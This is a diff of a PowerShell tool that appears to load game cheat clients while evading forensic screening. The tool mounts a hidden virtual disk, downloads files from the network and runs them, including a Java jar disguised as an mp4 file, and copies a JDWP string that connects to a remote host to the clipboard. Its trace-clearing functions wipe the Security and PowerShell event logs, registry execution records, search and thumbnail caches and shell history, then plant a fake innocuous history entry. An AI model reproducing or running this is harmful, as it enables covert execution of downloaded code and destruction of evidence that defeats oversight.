@@ -63,52 +63,28 @@ $ErrorActionPreference = 'SilentlyContinue'
 $WarningPreference = 'SilentlyContinue'
 $VerbosePreference = 'SilentlyContinue'
 
-# MAKE THE PARTITION
-$vdiskPath = "C:\temp\ddr.vhd"
+# FILELESS VHD CREATION
 $vdiskSizeMB = 2048
+$randomName = [System.IO.Path]::GetRandomFileName().Replace('.', '')
+$vdiskPath = "$env:TEMP\$randomName.vhd"
 
-# Ensure temp directory exists
-if (-not (Test-Path "C:\temp")) {
-    New-Item -ItemType Directory -Path "C:\temp" -Force | Out-Null
-}
-
-# Step 1: Clean up any existing virtual disk
-if (Test-Path -Path $vdiskPath) {
-    Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
-}
-
-# Step 2: Create the virtual disk
-$createVHDScript = @"
+# Create VHD using in-memory diskpart script
+$createScript = @"
 create vdisk file="$vdiskPath" maximum=$vdiskSizeMB type=expandable
-"@
-$scriptFileCreate = "C:\temp\create_$(Get-Random -Minimum 10000 -Maximum 99999).txt"
-try {
-    $createVHDScript | Set-Content -Path $scriptFileCreate -ErrorAction Stop
-    $result = diskpart /s $scriptFileCreate 2>$null
-    Remove-Item -Path $scriptFileCreate -Force -ErrorAction SilentlyContinue
-} catch {
-    Remove-Item -Path $scriptFileCreate -Force -ErrorAction SilentlyContinue
-    exit 1
-}
-
-# Step 3: Attach the virtual disk
-$attachVHDScript = @"
 select vdisk file="$vdiskPath"
 attach vdisk
 "@
-$scriptFileAttach = "C:\temp\attach_$(Get-Random -Minimum 10000 -Maximum 99999).txt"
+
+# Execute diskpart with in-memory script (no temp files)
 try {
-    $attachVHDScript | Set-Content -Path $scriptFileAttach -ErrorAction Stop
-    $result = diskpart /s $scriptFileAttach 2>$null
-    Remove-Item -Path $scriptFileAttach -Force -ErrorAction SilentlyContinue
+    $createScript | diskpart.exe 2>$null | Out-Null
 } catch {
-    Remove-Item -Path $scriptFileAttach -Force -ErrorAction SilentlyContinue
+    exit 1
 }
 
-# Step 4: Wait and configure disk with optimized timing
+# Quick disk detection and setup
 Start-Sleep -Seconds 1
 
-# Quick disk detection with short timeout
 $timeout = 0
 $disk = $null
 while ($timeout -lt 8) {
@@ -143,7 +119,7 @@ if ($disk) {
     }
 }
 
-# Download the sound file with quick retry logic
+# Download sound file directly to memory drive
 $soundFilePath = "Z:\na.wav"
 function Download-SoundFile {
     $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"
@@ -154,14 +130,11 @@ function Download-SoundFile {
         try {
             if (Test-Path "Z:\") {
                 Invoke-WebRequest -Uri $soundUrl -OutFile $soundFilePath -TimeoutSec 8 -ErrorAction Stop
-                # Quick file check
                 if ((Test-Path $soundFilePath) -and ((Get-Item $soundFilePath).Length -gt 0)) {
                     return $true
                 }
             }
-        } catch {
-            # Quick retry on failure
-        }
+        } catch { }
         $retryCount++
         if ($retryCount -lt $maxRetries) {
             Start-Sleep -Milliseconds 800
@@ -184,7 +157,7 @@ if ($driveReady) {
     Download-SoundFile
 }
 
-# Basic trace clearing function (called during operation)
+# Basic trace clearing function (minimal)
 function Clear-BasicTraces {
     try {
         # Clear PowerShell history
@@ -200,32 +173,29 @@ function Clear-BasicTraces {
             ForEach-Object { Remove-ItemProperty -Path $muiCachePath -Name $_.Name -ErrorAction SilentlyContinue }
         }
         
-        # Clear temp files (current session only)
-        Get-ChildItem -Path "C:\temp\*" -ErrorAction SilentlyContinue | 
-        Where-Object { $_.Name -notlike "*$(Get-Process -Id $PID | Select-Object -ExpandProperty ProcessName)*" } | 
-        Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+        # Clear temp VHD file
+        if (Test-Path $vdiskPath) {
+            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
+        }
         
-    } catch {
-        # Continue execution even if some cleanup fails
-    }
+    } catch { }
 }
 
-# Enhanced trace clearing function (called at the end)
+# Enhanced trace clearing function (comprehensive at end)
 function Clear-AllTraces {
     try {
-        # 1. Clear PowerShell history
+        # Clear PowerShell history
         Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
         Set-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex' -ErrorAction SilentlyContinue
         
-        # 2. Clear jump lists (but not Recent folder)
+        # Clear jump lists (but not Recent folder)
         $jumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
         Get-ChildItem -Path $jumpListPath -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
         
-        # 3. Clear custom jump lists
         $customJumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
         Get-ChildItem -Path $customJumpListPath -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
         
-        # 4. Registry cleanup - MuiCache
+        # Registry cleanup - MuiCache
         $muiCachePath = "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
         if (Test-Path $muiCachePath) {
             Get-ItemProperty $muiCachePath -ErrorAction SilentlyContinue | 
@@ -234,7 +204,7 @@ function Clear-AllTraces {
             ForEach-Object { Remove-ItemProperty -Path $muiCachePath -Name $_.Name -ErrorAction SilentlyContinue }
         }
         
-        # 5. BAM/DAM Registry cleanup
+        # BAM/DAM Registry cleanup
         $bamPaths = @(
             "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings",
             "HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings"
@@ -251,7 +221,7 @@ function Clear-AllTraces {
             }
         }
         
-        # 6. Clear UserAssist
+        # Clear UserAssist
         $userAssistPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
         if (Test-Path $userAssistPath) {
             Get-ChildItem -Path $userAssistPath -Recurse -ErrorAction SilentlyContinue | 
@@ -263,12 +233,12 @@ function Clear-AllTraces {
             }
         }
         
-        # 7. Clear Windows Search Database
+        # Clear Windows Search Database
         Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
         Remove-Item -Path "C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb" -Force -ErrorAction SilentlyContinue
         Start-Service -Name "WSearch" -ErrorAction SilentlyContinue
         
-        # 8. Clear thumbnail cache
+        # Clear thumbnail cache
         $thumbcachePaths = @(
             "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db",
             "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\iconcache_*.db"
@@ -277,7 +247,7 @@ function Clear-AllTraces {
             Get-ChildItem -Path $path -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
         }
         
-        # 9. Clear Event logs
+        # Clear Event logs
         $eventLogs = @("System", "Application", "Security", "Windows PowerShell")
         foreach ($log in $eventLogs) {
             Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
@@ -285,7 +255,7 @@ function Clear-AllTraces {
         wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
         wevtutil cl "Microsoft-Windows-Kernel-Process/Analytic" 2>$null
         
-        # 10. Clear JVM logs
+        # Clear JVM logs
         $jvmLogPaths = @(
             "$env:USERPROFILE\.java\deployment\log\*.log",
             "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
@@ -299,19 +269,18 @@ function Clear-AllTraces {
             }
         }
         
-        # 11. Clear Windows.old traces
+        # Clear Windows.old traces
         Remove-Item -Path "C:\Windows.old" -Recurse -Force -ErrorAction SilentlyContinue
         
-        # 12. Clear temp files
-        Get-ChildItem -Path "C:\temp\*" -ErrorAction SilentlyContinue | 
-        Where-Object { $_.Name -notlike "*$(Get-Process -Id $PID | Select-Object -ExpandProperty ProcessName)*" } | 
-        Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+        # Clear our VHD file
+        if (Test-Path $vdiskPath) {
+            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
+        }
         
-        Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+        # Clear temp files
+        Remove-Item -Path "$env:TEMP\*.vhd" -Force -ErrorAction SilentlyContinue
         
-    } catch {
-        # Continue execution even if some cleanup fails
-    }
+    } catch { }
 }
 
 # Create the main form
@@ -381,9 +350,7 @@ $injectButton.Add_Click({
             $player = New-Object System.Media.SoundPlayer
             $player.SoundLocation = $soundFilePath
             $player.PlaySync()
-        } catch {
-            # Continue without sound if playback fails
-        }
+        } catch { }
     }
     
     $form.Enabled = $true
@@ -441,9 +408,7 @@ $injectButton.Add_Click({
                     }
                 }
             }
-        } catch {
-            # Continue execution if download/execution fails
-        }
+        } catch { }
     })
     
     # DoomsDay Button
@@ -472,9 +437,7 @@ $injectButton.Add_Click({
             if ((Test-Path "Z:\cat.mp4") -and (Get-Command java -ErrorAction SilentlyContinue)) {
                 Start-Process java -ArgumentList '-jar "Z:\cat.mp4"' -ErrorAction SilentlyContinue
             }
-        } catch {
-            # Continue execution if download/execution fails
-        }
+        } catch { }
     })
     
     # VapeV4 Button
@@ -503,9 +466,7 @@ $injectButton.Add_Click({
             if (Test-Path "Z:\gentask.exe") {
                 Start-Process "Z:\gentask.exe" -ErrorAction SilentlyContinue
             }
-        } catch {
-            # Continue execution if download/execution fails
-        }
+        } catch { }
     })
     
     # VapeLite Button
@@ -534,9 +495,7 @@ $injectButton.Add_Click({
             if (Test-Path "Z:\ilasm.exe") {
                 Start-Process "Z:\ilasm.exe" -ErrorAction SilentlyContinue
             }
-        } catch {
-            # Continue execution if download/execution fails
-        }
+        } catch { }
     })
     
     # Phantom Button
@@ -552,9 +511,7 @@ $injectButton.Add_Click({
         try {
             $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
             Set-Clipboard -Value $clipboardText -ErrorAction SilentlyContinue
-        } catch {
-            # Continue execution if clipboard operation fails
-        }
+        } catch { }
     })
     
     # Add all buttons to form
@@ -566,7 +523,7 @@ $injectButton.Add_Click({
     $form.Controls.Add($backButton)
 })
 
-# Enhanced Destruct Button Click Handler
+# Enhanced Destruct Button Click Handler - FILELESS
 $destructButton.Add_Click({
     # Immediately close the form to prevent hanging
     $form.Hide()
@@ -576,10 +533,7 @@ $destructButton.Add_Click({
         # Clear basic traces during operation
         Clear-BasicTraces
         
-        # Detach and destroy virtual disk
-        $vdiskPath = "C:\temp\ddr.vhd"
-        
-        # Get disk info before detaching with quick timeout
+        # Fileless VHD destruction using in-memory diskpart
         $disk = $null
         $timeout = 0
         while ($timeout -lt 6) {
@@ -592,21 +546,18 @@ $destructButton.Add_Click({
         }
         
         if ($disk) {
-            # Detach the virtual disk
+            # Detach VHD using in-memory script
             $detachScript = @"
 select vdisk file="$vdiskPath"
 detach vdisk
 "@
-            $detachFile = "C:\temp\detach_$(Get-Random -Minimum 10000 -Maximum 99999).txt"
-            $detachScript | Set-Content -Path $detachFile -ErrorAction SilentlyContinue
-            $result = diskpart /s $detachFile 2>$null
-            Remove-Item -Path $detachFile -Force -ErrorAction SilentlyContinue
+            $detachScript | diskpart.exe 2>$null | Out-Null
         }
         
         # Wait for detachment
         Start-Sleep -Milliseconds 800
         
-        # Remove the virtual disk file
+        # Remove the VHD file from temp
         if (Test-Path $vdiskPath) {
             Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
         }
@@ -621,9 +572,7 @@ detach vdisk
         # Final comprehensive trace clearing at the end
         Clear-AllTraces
         
-    } catch {
-        # Even if some operations fail, continue with cleanup
-    } finally {
+    } catch { } finally {
         # Ensure form is disposed and application exits
         $form.Close()
         $form.Dispose()
